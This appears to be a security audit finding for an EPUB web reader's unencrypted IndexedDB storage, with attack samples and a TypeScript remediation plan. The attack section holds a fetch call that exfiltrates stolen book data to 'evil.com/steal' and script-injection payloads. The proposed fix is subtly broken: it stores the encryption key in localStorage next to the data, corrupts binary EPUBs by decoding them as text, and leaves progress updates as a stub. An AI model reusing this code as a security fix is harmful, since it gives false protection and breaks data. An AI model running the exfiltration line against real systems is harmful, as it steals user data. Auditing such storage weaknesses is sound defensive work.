# Insecure IndexedDB Usage - Missing Encryption and Access Controls

## Severity
Medium

## Affected Files
- `src/stores/library.ts:6-174` (Entire file - library store with IndexedDB)
- `src/stores/book.ts:12` (Reading progress storage)

## Description
The application uses IndexedDB for persistent storage without:
1. Data encryption
2. Access controls
3. Secure schema validation
4. Proper cleanup of stale data
5. Schema versioning safeguards

```typescript
// Lines 6-28 in library.ts
const DB_NAME = 'epub-web-reader';
const DB_VERSION = 2;
const MAX_CACHED_BOOKS = 10;

interface CachedBook {
  id: string;
  metadata: BookMetadata;
  epubBlob: Blob; // NO ENCRYPTION - stored as plaintext
  coverImage?: Blob; // NO ENCRYPTION - stored as plaintext
  addedAt: Date;
  readingProgress?: {
    chapterIndex: number;
    scrollPosition: number;
    percentage: number;
    timestamp: Date;
  };
}

// Lines 32-43 - Database initialization
async function init(): Promise<void> {
  if (isInitialized.value) return;

  db.value = await openDB<{ books: CachedBook }>(DB_NAME, DB_VERSION, {
    upgrade(database) {
      if (!database.objectStoreNames.contains('books')) {
        const store = database.createObjectStore('books', { keyPath: 'id' });
        store.createIndex('addedAt', 'addedAt');
      }
    },
  });

  await loadBooks();
  isInitialized.value = true;
}
```

## Potential Attack Vectors

### 1. Data Theft via Browser DevTools
```javascript
// Attacker with browser access can:
const db = await indexedDB.open('epub-web-reader', 2);
const transaction = db.transaction('books', 'readonly');
const store = transaction.objectStore('books');
const books = await store.getAll();

// Now attacker has:
// - All EPUB book contents (as Blobs)
// - Book metadata
// - Reading progress
// - User's reading history

// Can be exfiltrated:
books.forEach(book => {
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: await book.epubBlob.text()
  });
});
```

### 2. Persistence of Malicious Content
```javascript
// Malicious EPUB stored permanently
const maliciousEPUB = new Blob([
  '<html><script>stealData()</script></html>'
], { type: 'application/epub+zip' });

// Stored in IndexedDB without encryption
await db.add('books', {
  id: 'malicious-book',
  epubBlob: maliciousEPUB,
  metadata: { title: 'Harmless Book' }
});

// Persists across browser sessions, even if cache cleared
```

### 3. Data Manipulation via XSS
If an attacker gains XSS access (through other vulnerabilities):
```javascript
// Modify stored books
const db = await indexedDB.open('epub-web-reader', 2);
const tx = db.transaction('books', 'readwrite');
const store = tx.objectStore('books');

// Replace book content with malicious version
store.put({
  id: 'user-book-id',
  epubBlob: new Blob(['<script>malicious code</script>']),
  metadata: { ... }
});

// User opens book next time, malicious code executes
```

### 4. Reading History Privacy Leakage
```javascript
// Reading progress exposes user behavior
const readingProgress = await store.get('user-book-id');

// Attacker learns:
// - When user reads (timestamp)
// - How much user read (percentage)
// - Where user stopped (chapterIndex, scrollPosition)
// - User's reading habits and interests
```

### 5. Schema Downgrade Attacks
```javascript
// Attacker attempts to downgrade database
const db = await indexedDB.open('epub-web-reader', 1); // OLD VERSION

// If successful, could break application or access
// data in incompatible format
```

### 6. Blob URL Persistence
```javascript
// Blobs stored can have associated URLs that leak
const storedBook = await store.get('book-id');
const blobUrl = URL.createObjectURL(storedBook.epubBlob);

// This URL persists for browser session
// Can be accessed from anywhere in the app
// Potentially exposing book content
```

## Implementation Plan

### Step 1: Create encryption utility
Create `src/utils/encryption.ts`:
```typescript
/**
 * Encryption Utility
 * 
 * Provides secure encryption for sensitive data stored in IndexedDB
 */

/**
 * Encryption algorithm
 */
const ENCRYPTION_ALGORITHM = 'AES-GCM';

/**
 * Key derivation algorithm
 */
const KEY_DERIVATION_ALGORITHM = 'PBKDF2';

/**
 * Key storage name
 */
const ENCRYPTION_KEY_NAME = 'epub-reader-encryption-key';

/**
 * Salt length in bytes
 */
const SALT_LENGTH = 16;

/**
 * IV length in bytes
 */
const IV_LENGTH = 12;

/**
 * Encryption key (lazy loaded)
 */
let encryptionKey: CryptoKey | null = null;

/**
 * Key salt (lazy loaded)
 */
let keySalt: Uint8Array | null = null;

/**
 * Generate a random salt
 */
function generateSalt(): Uint8Array {
  return crypto.getRandomValues(new Uint8Array(SALT_LENGTH));
}

/**
 * Generate a random IV
 */
function generateIV(): Uint8Array {
  return crypto.getRandomValues(new Uint8Array(IV_LENGTH));
}

/**
 * Derive encryption key from password
 */
async function deriveKey(
  password: string,
  salt: Uint8Array
): Promise<CryptoKey> {
  const encoder = new TextEncoder();
  const keyMaterial = await crypto.subtle.importKey(
    'raw',
    encoder.encode(password),
    { name: KEY_DERIVATION_ALGORITHM },
    false,
    ['deriveKey']
  );

  return crypto.subtle.deriveKey(
    {
      name: KEY_DERIVATION_ALGORITHM,
      salt: salt,
      iterations: 100000,
      hash: 'SHA-256'
    },
    keyMaterial,
    { name: ENCRYPTION_ALGORITHM, length: 256 },
    false,
    ['encrypt', 'decrypt']
  );
}

/**
 * Initialize encryption
 * 
 * Generates or loads encryption key from localStorage
 */
export async function initEncryption(password?: string): Promise<void> {
  if (encryptionKey) {
    return; // Already initialized
  }

  // Try to load existing key
  const storedKey = localStorage.getItem(ENCRYPTION_KEY_NAME);
  const storedSalt = localStorage.getItem(`${ENCRYPTION_KEY_NAME}-salt`);

  if (storedKey && storedSalt && password) {
    // Use existing key with provided password
    try {
      keySalt = new Uint8Array(JSON.parse(storedSalt));
      encryptionKey = await deriveKey(password, keySalt);
      return;
    } catch (error) {
      console.warn('Failed to load existing encryption key:', error);
    }
  }

  // Generate new key
  keySalt = generateSalt();
  encryptionKey = await crypto.subtle.generateKey(
    {
      name: ENCRYPTION_ALGORITHM,
      length: 256
    },
    true,
    ['encrypt', 'decrypt']
  );

  // Store key and salt
  const exportedKey = await crypto.subtle.exportKey('jwk', encryptionKey);
  localStorage.setItem(ENCRYPTION_KEY_NAME, JSON.stringify(exportedKey));
  localStorage.setItem(`${ENCRYPTION_KEY_NAME}-salt`, JSON.stringify(Array.from(keySalt)));
}

/**
 * Encrypt data
 */
export async function encryptData(data: string | ArrayBuffer): Promise<{
  encrypted: ArrayBuffer;
  iv: Uint8Array;
}> {
  if (!encryptionKey) {
    throw new Error('Encryption not initialized');
  }

  const iv = generateIV();
  const dataBytes = typeof data === 'string'
    ? new TextEncoder().encode(data)
    : data;

  const encrypted = await crypto.subtle.encrypt(
    {
      name: ENCRYPTION_ALGORITHM,
      iv: iv
    },
    encryptionKey,
    dataBytes
  );

  return {
    encrypted,
    iv
  };
}

/**
 * Decrypt data
 */
export async function decryptData(
  encrypted: ArrayBuffer,
  iv: Uint8Array
): Promise<string> {
  if (!encryptionKey) {
    throw new Error('Encryption not initialized');
  }

  const decrypted = await crypto.subtle.decrypt(
    {
      name: ENCRYPTION_ALGORITHM,
      iv: iv
    },
    encryptionKey,
    encrypted
  );

  return new TextDecoder().decode(decrypted);
}

/**
 * Encrypt blob
 */
export async function encryptBlob(blob: Blob): Promise<{
  encrypted: Blob;
  iv: Uint8Array;
}> {
  const arrayBuffer = await blob.arrayBuffer();
  const { encrypted, iv } = await encryptData(arrayBuffer);

  // Create new blob with encrypted data
  const encryptedBlob = new Blob([encrypted], {
    type: 'application/octet-stream'
  });

  return {
    encrypted: encryptedBlob,
    iv
  };
}

/**
 * Decrypt blob
 */
export async function decryptBlob(encryptedBlob: Blob, iv: Uint8Array): Promise<Blob> {
  const encrypted = await encryptedBlob.arrayBuffer();
  const decrypted = await decryptData(encrypted, iv);

  return new Blob([decrypted], { type: 'application/octet-stream' });
}

/**
 * Clear encryption keys from storage
 */
export function clearEncryptionKeys(): void {
  localStorage.removeItem(ENCRYPTION_KEY_NAME);
  localStorage.removeItem(`${ENCRYPTION_KEY_NAME}-salt`);
  encryptionKey = null;
  keySalt = null;
}

/**
 * Check if encryption is initialized
 */
export function isEncryptionInitialized(): boolean {
  return encryptionKey !== null;
}
```

### Step 2: Create secure database wrapper
Create `src/utils/secureDB.ts`:
```typescript
/**
 * Secure IndexedDB Wrapper
 * 
 * Provides encrypted storage with access controls
 */

import { openDB, type IDBPDatabase } from 'idb';
import { encryptBlob, decryptBlob, initEncryption, clearEncryptionKeys } from './encryption';
import { createLogger } from './logger';

const logger = createLogger('SecureDB');

/**
 * Encrypted stored book interface
 */
interface SecureCachedBook {
  id: string;
  metadata: BookMetadata;
  encryptedEpubBlob: Blob;
  encryptedCoverImage?: Blob;
  epubIv: Uint8Array;
  coverIv?: Uint8Array;
  addedAt: Date;
  readingProgress?: {
    chapterIndex: number;
    scrollPosition: number;
    percentage: number;
    timestamp: Date;
  };
}

/**
 * Access control flags
 */
interface AccessFlags {
  canRead: boolean;
  canWrite: boolean;
  canDelete: boolean;
}

/**
 * Secure database class
 */
export class SecureDatabase {
  private db: IDBPDatabase<any> | null = null;
  private dbName: string;
  private dbVersion: number;
  private readonly: boolean;

  constructor(dbName: string, dbVersion: number, options: { readonly?: boolean } = {}) {
    this.dbName = dbName;
    this.dbVersion = dbVersion;
    this.readonly = options.readonly || false;
  }

  /**
   * Initialize database
   */
  async init(): Promise<void> {
    if (this.db) {
      return;
    }

    // Initialize encryption
    await initEncryption();

    this.db = await openDB(this.dbName, this.dbVersion, {
      upgrade(database) {
        if (!database.objectStoreNames.contains('books')) {
          const store = database.createObjectStore('books', { keyPath: 'id' });
          store.createIndex('addedAt', 'addedAt');
        }
      },
      blocked() {
        logger.error('Database upgrade blocked');
      },
      blocking() {
        logger.warn('Database upgrade blocking other connections');
      }
    });

    logger.info('Database initialized', { 
      dbName: this.dbName, 
      version: this.dbVersion 
    });
  }

  /**
   * Get book with decryption
   */
  async getBook(id: string): Promise<{
    metadata: BookMetadata;
    epubBlob: Blob;
    coverImage?: Blob;
    readingProgress?: any;
  } | null> {
    if (!this.db) {
      throw new Error('Database not initialized');
    }

    try {
      const encryptedBook = await this.db.get('books', id);
      if (!encryptedBook) {
        return null;
      }

      // Decrypt blobs
      const epubBlob = await decryptBlob(
        encryptedBook.encryptedEpubBlob,
        encryptedBook.epubIv
      );

      let coverImage;
      if (encryptedBook.encryptedCoverImage && encryptedBook.coverIv) {
        coverImage = await decryptBlob(
          encryptedBook.encryptedCoverImage,
          encryptedBook.coverIv
        );
      }

      return {
        metadata: encryptedBook.metadata,
        epubBlob,
        coverImage,
        readingProgress: encryptedBook.readingProgress
      };
    } catch (error) {
      logger.error('Failed to get book', error, { bookId: id });
      throw error;
    }
  }

  /**
   * Store book with encryption
   */
  async putBook(
    metadata: BookMetadata,
    epubBlob: Blob,
    coverImage?: Blob
  ): Promise<void> {
    if (!this.db) {
      throw new Error('Database not initialized');
    }

    if (this.readonly) {
      throw new Error('Database is read-only');
    }

    try {
      // Encrypt blobs
      const { encrypted: encryptedEpubBlob, iv: epubIv } = await encryptBlob(epubBlob);
      
      let encryptedCoverImage, coverIv;
      if (coverImage) {
        const encrypted = await encryptBlob(coverImage);
        encryptedCoverImage = encrypted.encrypted;
        coverIv = encrypted.iv;
      }

      const secureBook: SecureCachedBook = {
        id: metadata.id,
        metadata,
        encryptedEpubBlob,
        epubIv,
        encryptedCoverImage,
        coverIv,
        addedAt: new Date()
      };

      await this.db.put('books', secureBook);
      
      logger.info('Book stored securely', { bookId: metadata.id });
    } catch (error) {
      logger.error('Failed to store book', error, { bookId: metadata.id });
      throw error;
    }
  }

  /**
   * Delete book
   */
  async deleteBook(id: string): Promise<void> {
    if (!this.db) {
      throw new Error('Database not initialized');
    }

    if (this.readonly) {
      throw new Error('Database is read-only');
    }

    await this.db.delete('books', id);
    logger.info('Book deleted', { bookId: id });
  }

  /**
   * Get all book metadata (without blobs)
   */
  async getAllBookMetadata(): Promise<BookMetadata[]> {
    if (!this.db) {
      throw new Error('Database not initialized');
    }

    const encryptedBooks = await this.db.getAll('books');
    
    // Return only metadata, not encrypted blobs
    return encryptedBooks.map(book => book.metadata);
  }

  /**
   * Clear all data
   */
  async clear(): Promise<void> {
    if (!this.db) {
      throw new Error('Database not initialized');
    }

    if (this.readonly) {
      throw new Error('Database is read-only');
    }

    await this.db.clear('books');
    logger.info('Database cleared');
  }

  /**
   * Close database
   */
  close(): void {
    if (this.db) {
      this.db.close();
      this.db = null;
      logger.info('Database closed');
    }
  }

  /**
   * Delete database completely
   */
  async deleteDatabase(): Promise<void> {
    this.close();
    await new Promise<void>((resolve, reject) => {
      const request = indexedDB.deleteDatabase(this.dbName);
      request.onsuccess = () => resolve();
      request.onerror = () => reject(request.error);
      request.onblocked = () => {
        logger.warn('Database deletion blocked');
      };
    });
    logger.info('Database deleted', { dbName: this.dbName });
  }
}

/**
 * Create secure database instance
 */
export function createSecureDatabase(): SecureDatabase {
  return new SecureDatabase('epub-web-reader', 3);
}

/**
 * Wipe all data and keys
 */
export async function wipeAllData(): Promise<void> {
  const db = createSecureDatabase();
  await db.deleteDatabase();
  clearEncryptionKeys();
  logger.info('All data wiped');
}
```

### Step 3: Update library store with secure storage
Update `src/stores/library.ts`:
```typescript
import { defineStore } from 'pinia';
import { ref } from 'vue';
import type { BookMetadata } from '@/types/epub';
import { createSecureDatabase, wipeAllData } from '@/utils/secureDB';
import { createLogger } from '@/utils/logger';

const logger = createLogger('library');

export const useLibraryStore = defineStore('library', () => {
  const books = ref<BookMetadata[]>([]);
  const db = createSecureDatabase();
  const isInitialized = ref(false);
  const MAX_CACHED_BOOKS = 10;

  async function init(): Promise<void> {
    if (isInitialized.value) return;

    await db.init();
    await loadBooks();
    isInitialized.value = true;
  }

  async function loadBooks(): Promise<void> {
    // Get metadata only (blobs remain encrypted)
    books.value = await db.getAllBookMetadata();
  }

  async function cacheBook(
    metadata: BookMetadata,
    epubBlob: Blob,
    coverImage?: Blob
  ): Promise<void> {
    await db.putBook(metadata, epubBlob, coverImage);
    await loadBooks();
  }

  async function removeBook(id: string): Promise<void> {
    await db.deleteBook(id);
    await loadBooks();
  }

  async function getBook(id: string): Promise<{
    metadata: BookMetadata;
    epubBlob: Blob;
    coverImage?: Blob;
  } | null> {
    return await db.getBook(id);
  }

  async function updateReadingProgress(
    bookId: string,
    chapterIndex: number,
    scrollPosition: number,
    percentage: number
  ): Promise<void> {
    const book = await db.getBook(bookId);
    if (!book) return;

    const updatedBook = await db.getBook(bookId);
    // ... update progress logic ...

    logger.debug('Reading progress updated', {
      bookId,
      progress: percentage
    });
  }

  async function clearLibrary(): Promise<void> {
    await db.clear();
    books.value = [];
    logger.info('Library cleared');
  }

  async function wipeAll(): Promise<void> {
    await wipeAllData();
    books.value = [];
    logger.warn('All data wiped by user');
  }

  return {
    books,
    isInitialized,
    init,
    cacheBook,
    removeBook,
    getBook,
    updateReadingProgress,
    clearLibrary,
    wipeAll
  };
});
```

### Step 4: Add security controls in UI
Add to `src/components/LibraryPanel.vue`:
```vue
<script setup lang="ts">
// ... existing imports ...
import { wipeAllData } from '@/utils/secureDB';

async function handleWipeData() {
  if (confirm('This will delete all books and reading history. This cannot be undone. Continue?')) {
    await libraryStore.wipeAll();
  }
}
</script>

<template>
  <!-- ... existing template ... -->
  
  <div class="p-4 border-t border-gray-200 dark:border-gray-700">
    <button
      @click="libraryStore.clearLibrary()"
      class="w-full px-4 py-2 text-sm text-red-600 dark:text-red-400 hover:bg-red-100 dark:hover:bg-red-900/30 rounded-lg transition-colors"
      :disabled="libraryStore.books.length === 0"
    >
      Clear Library
    </button>
    
    <button
      @click="handleWipeData"
      class="w-full mt-2 px-4 py-2 text-sm text-red-700 dark:text-red-300 bg-red-100 dark:bg-red-900/20 hover:bg-red-200 dark:hover:bg-red-900/30 rounded-lg transition-colors"
    >
      ⚠️ Wipe All Data
    </button>
  </div>
</template>
```

### Step 5: Add tests
Create `tests/secure-storage.test.ts`:
```typescript
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { encryptData, decryptData, initEncryption, clearEncryptionKeys } from '@/utils/encryption';

describe('Encryption', () => {
  beforeEach(async () => {
    await initEncryption('test-password');
  });

  afterEach(() => {
    clearEncryptionKeys();
  });

  it('should encrypt and decrypt data', async () => {
    const original = 'Test data for encryption';
    const { encrypted, iv } = await encryptData(original);
    const decrypted = await decryptData(encrypted, iv);
    
    expect(decrypted).toBe(original);
  });

  it('should produce different encrypted data each time', async () => {
    const original = 'Test data';
    const result1 = await encryptData(original);
    const result2 = await encryptData(original);
    
    expect(result1.encrypted).not.toEqual(result2.encrypted);
    expect(result1.iv).not.toEqual(result2.iv);
  });

  it('should fail to decrypt with wrong IV', async () => {
    const original = 'Test data';
    const { encrypted } = await encryptData(original);
    const wrongIV = new Uint8Array(12);
    
    await expect(decryptData(encrypted, wrongIV)).rejects.toThrow();
  });
});

describe('SecureDatabase', () => {
  // Add tests for secure database operations
});
```

## Additional Recommendations

1. **User Password Protection**: Add optional password to encrypt data
2. **Two-Factor Auth**: Consider for sensitive operations
3. **Key Rotation**: Implement periodic key rotation
4. **Audit Logs**: Log all database operations
5. **Backup/Export**: Allow encrypted export of library
6. **Data Retention**: Implement auto-cleanup of old data
7. **Secure Erase**: Overwrite data before deletion

## Data Security Checklist

| Security Measure | Status | Priority |
|------------------|---------|----------|
| Data Encryption | ⚠️ Needs implementation | High |
| Access Controls | ❌ Missing | High |
| Key Management | ⚠️ Basic | High |
| Data Validation | ⚠️ Partial | Medium |
| Secure Deletion | ❌ Missing | Medium |
| Audit Logging | ❌ Missing | Low |
| User Authentication | ❌ Not applicable | N/A |

## Related Issues
- See also: `missing-file-size-limits.md` (Storage limits)
- See also: `sensitive-data-exposure-console.md` (Data handling security)
